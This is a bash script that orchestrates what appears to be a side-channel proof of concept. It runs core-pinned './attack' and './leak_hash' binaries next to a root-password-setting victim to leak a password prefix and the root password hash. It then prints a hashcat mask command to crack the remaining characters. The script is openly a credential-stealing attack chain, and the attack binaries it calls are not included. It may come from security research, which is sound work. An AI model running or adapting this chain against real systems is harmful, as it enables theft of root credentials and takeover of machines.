#!/bin/bash

killall attack 2>/dev/null
killall leak_hash 2>/dev/null

make all

echo
echo "Running prefix attack..."

taskset -c 1,5 ./attack | tee prefix_output.txt & (sleep 1 && taskset -c 3 /tmp/set_root_password)

# Extract operands
PREFIX=$(grep "Prefix: " prefix_output.txt | cut -d' ' -f2)

echo
echo "Running leak hash..."

taskset -c 0,4 ./leak_hash | tee leak_output.txt

HASH=$(grep "Hash: " leak_output.txt | cut -d':' -f3)

echo
echo "Prefix found: ${PREFIX}"
echo "Hash found: ${HASH}"

echo
echo "Run the following command to crack the hash:"
echo "hashcat -m 500 -a 3 -1 '?l?d' '${HASH}' '${PREFIX}?1?1?1?1?1'"

make clean > /dev/null
rm prefix_output.txt leak_output.txt
